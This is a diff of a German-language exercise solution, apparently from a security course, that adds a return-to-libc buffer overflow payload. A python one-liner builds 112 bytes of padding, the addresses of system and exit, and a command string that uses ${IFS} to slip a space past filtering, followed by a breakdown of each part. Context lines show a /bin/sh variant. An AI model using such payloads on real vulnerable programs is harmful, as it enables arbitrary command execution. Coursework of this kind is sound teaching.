@@ -5,3 +5,12 @@ Zusammensetzung:
 -Adresse "system"
 -Adresse "exit" <- Für sauberes Terminieren!
 -Adresse "/bin/sh"
+
+Lösung Aufgabe 2b) i):
+run $(python -c "print'\x90'*112 + '\x10\xcd\xe1\xf7' + '\x70\xff\xe0\xf7' + '\x47\xd2\xff\xff' + 'touch$\x7BIFS\x7Downed'")
+Zusammensetzung:
+-112 Byte Padding (Buffer)
+-Adresse "system"
+-Adresse "exit" <- Für sauberes Terminieren!
+-Adresse "touch owned"
+-Befehl "touch owned", wobei das Leerzeichen mithilfe der Umgebungsvariblen "IFS" escaped wird.
